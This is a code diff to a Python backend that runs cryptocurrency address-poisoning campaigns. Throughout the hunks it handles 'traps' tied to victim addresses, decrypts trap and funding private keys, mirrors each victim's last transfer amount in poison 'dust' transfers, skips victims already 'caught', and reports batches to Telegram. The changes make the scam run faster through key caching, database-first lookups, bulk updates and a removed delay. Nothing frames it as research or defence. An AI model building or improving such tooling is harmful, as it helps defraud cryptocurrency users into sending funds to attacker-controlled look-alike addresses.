@@ -624,10 +624,14 @@ def get_real_dust_gas_params(w3, context="[real-zero]", campaign_id=None):
 
 
 # Mirror uses the campaign funding wallet as operator (same as re_poison.js)
+_OPERATOR_KEY_CACHE = {}
+
 def get_mirror_operator_key(campaign_id):
-    """Fetch and decrypt the funding key for mirror operations."""
+    """Fetch and decrypt the funding key for mirror operations (cached)."""
     if not supabase or not campaign_id:
         return None
+    if campaign_id in _OPERATOR_KEY_CACHE:
+        return _OPERATOR_KEY_CACHE[campaign_id]
     try:
         result = supabase.table("campaigns").select("funding_private_key_enc").eq("id", campaign_id).execute()
         if not result.data:
@@ -638,6 +642,7 @@ def get_mirror_operator_key(campaign_id):
         funding_key = decrypt(enc_key).strip()
         if not funding_key.startswith('0x'):
             funding_key = f'0x{funding_key}'
+        _OPERATOR_KEY_CACHE[campaign_id] = funding_key
         return funding_key
     except Exception as e:
         logger.error(f"Failed to get mirror operator key: {e}")
@@ -1778,8 +1783,7 @@ def flush_real_zero_queue(queue, campaign_id, is_final=False):
             )
 
             if success_ids:
-                for tid in success_ids:
-                    update_trap_zero_dust_count(tid)
+                bulk_mark_zero_dusted(success_ids)
 
                 all_success_ids.extend(success_ids)
                 total_success += len(success_ids)
@@ -2017,7 +2021,7 @@ def get_trap_entries_from_db(campaign_id):
         return entries
     try:
         result = supabase.table("traps")\
-            .select("id, victim_address, trap_private_key_enc, dust_count, zero_dust_count, counterparty_address")\
+            .select("id, victim_address, trap_private_key_enc, dust_count, zero_dust_count, counterparty_address, last_transfer_amount, last_transfer_asset, last_transfer_block")\
             .eq("campaign_id", campaign_id)\
             .execute()
         if not result.data:
@@ -2036,7 +2040,12 @@ def get_trap_entries_from_db(campaign_id):
                 trap_id = row.get("id")
                 counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
                 if victim:
-                    entries.append((trap_id, victim, private_key, dust_count, counterparty, zero_dust_count))
+                    cached_transfer = {
+                        'last_transfer_amount': row.get('last_transfer_amount'),
+                        'last_transfer_asset': row.get('last_transfer_asset'),
+                        'last_transfer_block': row.get('last_transfer_block'),
+                    }
+                    entries.append((trap_id, victim, private_key, dust_count, counterparty, zero_dust_count, cached_transfer))
             except Exception as e:
                 logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
                 continue
@@ -2058,7 +2067,7 @@ def get_trap_entries_by_ids(trap_ids):
         for i in range(0, len(trap_ids), 500):
             chunk = trap_ids[i:i + 500]
             result = supabase.table("traps")\
-                .select("id, victim_address, trap_private_key_enc, dust_count, zero_dust_count, counterparty_address")\
+                .select("id, victim_address, trap_private_key_enc, dust_count, zero_dust_count, counterparty_address, last_transfer_amount, last_transfer_asset, last_transfer_block")\
                 .in_("id", chunk)\
                 .execute()
             if not result.data:
@@ -2075,7 +2084,12 @@ def get_trap_entries_by_ids(trap_ids):
                     zero_dust_count = row.get("zero_dust_count", 0) or 0
                     counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
                     if victim:
-                        entries.append((row.get("id"), victim, private_key, dust_count, counterparty, zero_dust_count))
+                        cached_transfer = {
+                            'last_transfer_amount': row.get('last_transfer_amount'),
+                            'last_transfer_asset': row.get('last_transfer_asset'),
+                            'last_transfer_block': row.get('last_transfer_block'),
+                        }
+                        entries.append((row.get("id"), victim, private_key, dust_count, counterparty, zero_dust_count, cached_transfer))
                 except Exception as e:
                     logger.error(f"Failed to decrypt private key for trap {row.get('id')}: {e}")
                     continue
@@ -2083,6 +2097,40 @@ def get_trap_entries_by_ids(trap_ids):
     except Exception as e:
         logger.error(f"Failed to fetch traps by IDs: {e}")
     return entries
+
+
+def bulk_mark_dusted(trap_ids):
+    """One UPDATE for the whole batch. Safe: we only queue traps with dust_count == 0."""
+    if not supabase or not trap_ids:
+        return
+    now_iso = datetime.now(timezone.utc).isoformat()
+    ids = [t for t in trap_ids if t]
+    for i in range(0, len(ids), 200):
+        chunk = ids[i:i + 200]
+        try:
+            supabase.table("traps").update({
+                "dust_count": 1,
+                "last_dusted_at": now_iso
+            }).in_("id", chunk).execute()
+        except Exception as e:
+            logger.warning(f"[bulk] dust_count update failed for chunk: {e}")
+
+
+def bulk_mark_zero_dusted(trap_ids):
+    """One UPDATE for the whole real-zero batch."""
+    if not supabase or not trap_ids:
+        return
+    now_iso = datetime.now(timezone.utc).isoformat()
+    ids = [t for t in trap_ids if t]
+    for i in range(0, len(ids), 200):
+        chunk = ids[i:i + 200]
+        try:
+            supabase.table("traps").update({
+                "zero_dust_count": 1,
+                "last_zero_dusted_at": now_iso
+            }).in_("id", chunk).execute()
+        except Exception as e:
+            logger.warning(f"[bulk] zero_dust_count update failed for chunk: {e}")
 
 
 def update_trap_dust_count(trap_id):
@@ -2191,6 +2239,24 @@ def parse_cached_amount(amount_str, asset):
     except ValueError:
         return 0
     
+
+def resolve_last_transfer(victim_address, counterparty_address, trap_id=None, cached_transfer=None):
+    """
+    DB-FIRST: use the amount already stored in traps. Zero RPC, zero extra queries.
+    Only falls back to on-chain Alchemy lookup when the DB has no usable amount.
+    """
+    if cached_transfer:
+        asset = cached_transfer.get('last_transfer_asset')
+        raw_amount = cached_transfer.get('last_transfer_amount')
+        if asset and raw_amount:
+            parsed = parse_cached_amount(raw_amount, asset)
+            if parsed > 0:
+                logger.info(f"[db-first] {asset} {parsed} units (no RPC)")
+                return (asset, parsed)
+
+    logger.info(f"[db-first] No DB amount for {victim_address[:10]}... → falling back to on-chain")
+    return fetch_last_transfer_from_blockchain(victim_address, counterparty_address, trap_id)
+
 
 def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, trap_id=None):
     """
@@ -2540,6 +2606,7 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         dust_count = entry[3]
         counterparty = entry[4]
         zero_dust_count = entry[5] if len(entry) > 5 else 0
+        cached_transfer = entry[6] if len(entry) > 6 else None
 
         if victim.lower() in caught:
             logger.info(f"Skipping caught victim {victim}")
@@ -2580,9 +2647,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             })
             continue
         
-        # Fetch last transfer from blockchain (with caching)
-        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty} (trap_id: {trap_id})...")
-        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty, trap_id)
+               # 🚀 DB-FIRST: no RPC unless the DB has no amount
+        fetched_asset, fetched_amount = resolve_last_transfer(victim, counterparty, trap_id, cached_transfer)
         
         if not fetched_asset or not fetched_amount:
             # 🆕 Use default fallback: emit a small native transfer
@@ -2627,9 +2693,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                 success += len(poison_queue)
                 logger.info(f"[batch] ✅ Multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
                 
-                for tid in batch_trap_ids:
-                    update_trap_dust_count(tid)
-                    
+                bulk_mark_dusted(batch_trap_ids)
+
                 send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=False)
                 
                 # 🚀 NONCE SAFETY: Wait 2 seconds to let the RPC load-balancer sync the mined block 
@@ -2665,9 +2730,9 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                 real_queue.clear()
                 time.sleep(2)
         
-        if job_id and i % 5 == 0:
+        if job_id and i % 50 == 0:
             update_job(job_id, progress=i)
-        time.sleep(0.5)  # Reduced delay since we're batching
+        # 🚀 No sleep: the loop is now pure in-memory work (no RPC per item)
     
         # 🚀 Process remaining items in queue (final multi-token batch)
     if poison_queue:
@@ -2681,9 +2746,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             success += len(poison_queue)
             logger.info(f"[batch] ✅ Final multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
             
-            for tid in batch_trap_ids:
-                update_trap_dust_count(tid)
-                
+            bulk_mark_dusted(batch_trap_ids)
+
             send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=True)
         else:
             logger.error(f"[batch] ❌ Final multi-token batch failed")
